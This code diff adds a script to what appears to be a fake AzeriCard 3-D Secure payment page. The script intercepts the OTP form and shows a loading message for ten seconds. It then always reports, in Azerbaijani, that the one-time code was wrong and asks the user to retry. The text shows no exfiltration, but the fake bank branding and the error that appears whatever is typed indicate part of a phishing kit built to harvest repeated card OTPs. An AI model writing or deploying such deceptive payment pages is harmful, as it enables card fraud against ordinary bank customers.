@@ -344,3 +344,39 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    if (window.location.href.includes('azericard-3ds.html')) {
+        const otpForm = document.querySelector('form');
+        if (otpForm) {
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault(); 
+                
+                const btn = otpForm.querySelector('button[type="submit"]');
+                if (btn) {
+                    btn.innerText = 'Yüklənir...';
+                    btn.disabled = true;
+                }
+                
+                setTimeout(function() {
+                    if (btn) {
+                        btn.innerText = 'Ödənişi təsdiqlə';
+                        btn.disabled = false;
+                    }
+                    
+                    let err = document.querySelector('.error-message');
+                    if (!err) {
+                        err = document.createElement('div');
+                        err.className = 'error-message';
+                        err.style.color = 'red';
+                        err.style.marginTop = '10px';
+                        err.style.fontSize = '14px';
+                        err.style.textAlign = 'center';
+                        otpForm.appendChild(err);
+                    }
+                    err.innerText = 'Səhv OTP kodu, zəhmət olmasa təkrar yoxlayın.';
+                }, 10000);
+            });
+        }
+    }
+});
